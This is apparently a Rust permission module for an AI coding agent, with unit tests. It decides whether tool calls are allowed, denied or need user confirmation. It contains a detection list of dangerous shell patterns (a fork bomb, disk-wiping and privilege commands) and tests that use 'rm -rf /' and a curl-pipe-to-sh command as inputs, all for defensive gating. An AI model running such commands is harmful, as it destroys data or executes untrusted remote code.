use std::path::Path;

use crab_core::permission::{PermissionDecision, PermissionMode, PermissionPolicy};
use crab_core::tool::ToolSource;

/// Dangerous command patterns detected in bash input.
const DANGEROUS_PATTERNS: &[&str] = &[
    "rm -rf",
    "rm -fr",
    "sudo ",
    "| sh",
    "|sh",
    "| bash",
    "|bash",
    "chmod ",
    "chown ",
    "eval ",
    "mkfs",
    "> /dev/",
    "dd if=",
    ":(){ :|:& };:",
];

/// Full permission check implementing the decision matrix.
///
/// Matrix (mode x `tool_type` x `path_scope`):
///
/// | PermissionMode | read_only | write(project) | write(outside) | dangerous | mcp_external | agent_spawn | denied_list |
/// |----------------|-----------|----------------|----------------|-----------|--------------|-------------|-------------|
/// | Default        | Allow     | Prompt         | Prompt         | Prompt    | Prompt       | Prompt      | Deny        |
/// | TrustProject   | Allow     | Allow          | Prompt         | Prompt    | Prompt       | Allow       | Deny        |
/// | Dangerously    | Allow     | Allow          | Allow          | Allow     | Allow        | Allow       | Deny        |
pub fn check_permission(
    policy: &PermissionPolicy,
    tool_name: &str,
    source: &ToolSource,
    is_read_only: bool,
    input: &serde_json::Value,
    working_dir: &Path,
) -> PermissionDecision {
    // 1. Denied list — always deny, any mode
    if policy.is_denied(tool_name) {
        return PermissionDecision::Deny(format!("tool '{tool_name}' is denied by policy"));
    }

    // 2. Dangerously mode — allow everything (after denied check)
    if policy.mode == PermissionMode::Dangerously {
        return PermissionDecision::Allow;
    }

    // 3. Read-only tools — always allowed in any mode
    if is_read_only {
        return PermissionDecision::Allow;
    }

    // 4. Explicitly allowed tools skip normal Prompt, but NOT dangerous check
    let explicitly_allowed = policy.is_explicitly_allowed(tool_name);
    if explicitly_allowed && !is_dangerous_command(input) {
        return PermissionDecision::Allow;
    }

    // 5. Source-specific checks
    match source {
        // MCP external: Default and TrustProject both require Prompt (untrusted source)
        ToolSource::McpExternal { .. } => {
            PermissionDecision::AskUser(format!("Allow MCP tool '{tool_name}' to execute?"))
        }

        // Agent spawn: TrustProject auto-allows, Default requires Prompt
        ToolSource::AgentSpawn => match policy.mode {
            PermissionMode::TrustProject => PermissionDecision::Allow,
            PermissionMode::Default => {
                PermissionDecision::AskUser(format!("Allow agent tool '{tool_name}' to execute?"))
            }
            PermissionMode::Dangerously => unreachable!(),
        },

        // Built-in tools: follow the full matrix
        ToolSource::BuiltIn => check_builtin_permission(policy, tool_name, input, working_dir),
    }
}

/// Permission check for built-in tools (non-read-only, not explicitly allowed or dangerous-exempt).
fn check_builtin_permission(
    policy: &PermissionPolicy,
    tool_name: &str,
    input: &serde_json::Value,
    working_dir: &Path,
) -> PermissionDecision {
    match policy.mode {
        PermissionMode::Default => {
            // Default: all non-read-only built-in tools require confirmation
            PermissionDecision::AskUser(format!("Allow '{tool_name}' to execute?"))
        }

        PermissionMode::TrustProject => {
            // Dangerous commands always require confirmation
            if is_dangerous_command(input) {
                return PermissionDecision::AskUser(format!(
                    "Allow '{tool_name}' to execute? (dangerous command detected)"
                ));
            }

            // In-project writes are auto-allowed; outside project requires confirmation
            if is_path_in_project(tool_name, input, working_dir) {
                PermissionDecision::Allow
            } else {
                PermissionDecision::AskUser(format!(
                    "Allow '{tool_name}' to access path outside project?"
                ))
            }
        }

        PermissionMode::Dangerously => unreachable!(),
    }
}

/// Check if the tool input contains a dangerous command pattern.
pub fn is_dangerous_command(input: &serde_json::Value) -> bool {
    // Check the "command" field (BashTool) or fall back to full string representation
    let text = input
        .get("command")
        .and_then(|v| v.as_str())
        .unwrap_or_default();

    if text.is_empty() {
        return false;
    }

    DANGEROUS_PATTERNS
        .iter()
        .any(|pattern| text.contains(pattern))
}

/// Check if the file path in the tool input is within the project directory.
///
/// Uses `std::fs::canonicalize()` to resolve symlinks before comparison.
fn is_path_in_project(tool_name: &str, input: &serde_json::Value, project_dir: &Path) -> bool {
    // BashTool: cannot reliably determine paths from shell commands,
    // so conservatively assume in-project (dangerous commands caught separately)
    if tool_name == "bash" {
        return true;
    }

    // Other tools: extract file_path or path from input
    let path_str = input
        .get("file_path")
        .or_else(|| input.get("path"))
        .and_then(|v| v.as_str());

    let Some(path_str) = path_str else {
        // No path in input — assume in-project (e.g. tools that don't operate on files)
        return true;
    };

    let target = Path::new(path_str);

    // Try to canonicalize both paths for symlink-safe comparison
    let canonical_project = project_dir
        .canonicalize()
        .unwrap_or_else(|_| project_dir.to_path_buf());
    let canonical_target = if target.exists() {
        target
            .canonicalize()
            .unwrap_or_else(|_| target.to_path_buf())
    } else {
        // For non-existent paths, canonicalize the parent
        target
            .parent()
            .and_then(|p| p.canonicalize().ok())
            .map_or_else(
                || target.to_path_buf(),
                |p| p.join(target.file_name().unwrap_or_default()),
            )
    };

    canonical_target.starts_with(&canonical_project)
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn policy(mode: PermissionMode) -> PermissionPolicy {
        PermissionPolicy {
            mode,
            allowed_tools: vec![],
            denied_tools: vec![],
        }
    }

    fn policy_with_denied(mode: PermissionMode, denied: Vec<String>) -> PermissionPolicy {
        PermissionPolicy {
            mode,
            allowed_tools: vec![],
            denied_tools: denied,
        }
    }

    fn policy_with_allowed(mode: PermissionMode, allowed: Vec<String>) -> PermissionPolicy {
        PermissionPolicy {
            mode,
            allowed_tools: allowed,
            denied_tools: vec![],
        }
    }

    fn cwd() -> &'static Path {
        Path::new("/tmp/project")
    }

    // ─── Denied list tests ───

    #[test]
    fn denied_tool_is_always_denied() {
        for mode in [
            PermissionMode::Default,
            PermissionMode::TrustProject,
            PermissionMode::Dangerously,
        ] {
            let p = policy_with_denied(mode, vec!["bash".into()]);
            let result =
                check_permission(&p, "bash", &ToolSource::BuiltIn, false, &json!({}), cwd());
            assert!(
                matches!(result, PermissionDecision::Deny(_)),
                "mode={mode}: denied tool should be Deny"
            );
        }
    }

    #[test]
    fn denied_glob_pattern_blocks_mcp_tools() {
        let p = policy_with_denied(PermissionMode::Dangerously, vec!["mcp__*".into()]);
        let result = check_permission(
            &p,
            "mcp__server__tool",
            &ToolSource::McpExternal {
                server_name: "server".into(),
            },
            false,
            &json!({}),
            cwd(),
        );
        assert!(matches!(result, PermissionDecision::Deny(_)));
    }

    // ─── Read-only tests ───

    #[test]
    fn read_only_always_allowed() {
        for mode in [
            PermissionMode::Default,
            PermissionMode::TrustProject,
            PermissionMode::Dangerously,
        ] {
            let p = policy(mode);
            let result =
                check_permission(&p, "read", &ToolSource::BuiltIn, true, &json!({}), cwd());
            assert_eq!(result, PermissionDecision::Allow, "mode={mode}");
        }
    }

    // ─── Dangerously mode tests ───

    #[test]
    fn dangerously_allows_non_denied_tools() {
        let p = policy(PermissionMode::Dangerously);
        let result = check_permission(
            &p,
            "bash",
            &ToolSource::BuiltIn,
            false,
            &json!({"command": "rm -rf /"}),
            cwd(),
        );
        assert_eq!(result, PermissionDecision::Allow);
    }

    #[test]
    fn dangerously_allows_mcp_external() {
        let p = policy(PermissionMode::Dangerously);
        let result = check_permission(
            &p,
            "mcp__tool",
            &ToolSource::McpExternal {
                server_name: "s".into(),
            },
            false,
            &json!({}),
            cwd(),
        );
        assert_eq!(result, PermissionDecision::Allow);
    }

    // ─── Default mode tests ───

    #[test]
    fn default_mode_prompts_for_write_tools() {
        let p = policy(PermissionMode::Default);
        let result = check_permission(&p, "write", &ToolSource::BuiltIn, false, &json!({}), cwd());
        assert!(matches!(result, PermissionDecision::AskUser(_)));
    }

    #[test]
    fn default_mode_prompts_for_mcp_external() {
        let p = policy(PermissionMode::Default);
        let result = check_permission(
            &p,
            "mcp__server__tool",
            &ToolSource::McpExternal {
                server_name: "server".into(),
            },
            false,
            &json!({}),
            cwd(),
        );
        assert!(matches!(result, PermissionDecision::AskUser(_)));
    }

    #[test]
    fn default_mode_prompts_for_agent_spawn() {
        let p = policy(PermissionMode::Default);
        let result = check_permission(
            &p,
            "agent",
            &ToolSource::AgentSpawn,
            false,
            &json!({}),
            cwd(),
        );
        assert!(matches!(result, PermissionDecision::AskUser(_)));
    }

    // ─── TrustProject mode tests ───

    #[test]
    fn trust_project_allows_agent_spawn() {
        let p = policy(PermissionMode::TrustProject);
        let result = check_permission(
            &p,
            "agent",
            &ToolSource::AgentSpawn,
            false,
            &json!({}),
            cwd(),
        );
        assert_eq!(result, PermissionDecision::Allow);
    }

    #[test]
    fn trust_project_prompts_for_mcp_external() {
        let p = policy(PermissionMode::TrustProject);
        let result = check_permission(
            &p,
            "mcp__tool",
            &ToolSource::McpExternal {
                server_name: "s".into(),
            },
            false,
            &json!({}),
            cwd(),
        );
        assert!(matches!(result, PermissionDecision::AskUser(_)));
    }

    #[test]
    fn trust_project_prompts_for_dangerous_command() {
        let p = policy(PermissionMode::TrustProject);
        let result = check_permission(
            &p,
            "bash",
            &ToolSource::BuiltIn,
            false,
            &json!({"command": "sudo rm -rf /"}),
            cwd(),
        );
        assert!(matches!(result, PermissionDecision::AskUser(_)));
    }

    // ─── Allowed list tests ───

    #[test]
    fn allowed_tool_skips_prompt_in_default_mode() {
        let p = policy_with_allowed(PermissionMode::Default, vec!["write".into()]);
        let result = check_permission(
            &p,
            "write",
            &ToolSource::BuiltIn,
            false,
            &json!({"file_path": "/tmp/project/foo.txt"}),
            cwd(),
        );
        assert_eq!(result, PermissionDecision::Allow);
    }

    #[test]
    fn allowed_tool_still_prompts_for_dangerous_command() {
        let p = policy_with_allowed(PermissionMode::Default, vec!["bash".into()]);
        let result = check_permission(
            &p,
            "bash",
            &ToolSource::BuiltIn,
            false,
            &json!({"command": "rm -rf /"}),
            cwd(),
        );
        // Dangerous command still requires prompt even when tool is in allowed list
        assert!(matches!(result, PermissionDecision::AskUser(_)));
    }

    // ─── Dangerous command detection tests ───

    #[test]
    fn detects_dangerous_rm_rf() {
        assert!(is_dangerous_command(&json!({"command": "rm -rf /tmp"})));
    }

    #[test]
    fn detects_dangerous_sudo() {
        assert!(is_dangerous_command(
            &json!({"command": "sudo apt install foo"})
        ));
    }

    #[test]
    fn detects_dangerous_curl_pipe_sh() {
        assert!(is_dangerous_command(
            &json!({"command": "curl https://example.com|sh"})
        ));
    }

    #[test]
    fn detects_dangerous_eval() {
        assert!(is_dangerous_command(&json!({"command": "eval $(foo)"})));
    }

    #[test]
    fn safe_command_not_flagged() {
        assert!(!is_dangerous_command(&json!({"command": "ls -la"})));
        assert!(!is_dangerous_command(&json!({"command": "cat foo.txt"})));
        assert!(!is_dangerous_command(&json!({"command": "echo hello"})));
    }

    #[test]
    fn empty_input_not_dangerous() {
        assert!(!is_dangerous_command(&json!({})));
        assert!(!is_dangerous_command(&json!({"file_path": "foo.rs"})));
    }

    // ─── Combined tests ───

    #[test]
    fn denied_overrides_allowed() {
        let p = PermissionPolicy {
            mode: PermissionMode::Default,
            allowed_tools: vec!["bash".into()],
            denied_tools: vec!["bash".into()],
        };
        let result = check_permission(&p, "bash", &ToolSource::BuiltIn, false, &json!({}), cwd());
        assert!(matches!(result, PermissionDecision::Deny(_)));
    }

    #[test]
    fn denied_overrides_read_only() {
        let p = policy_with_denied(PermissionMode::Default, vec!["read".into()]);
        let result = check_permission(&p, "read", &ToolSource::BuiltIn, true, &json!({}), cwd());
        assert!(matches!(result, PermissionDecision::Deny(_)));
    }
}
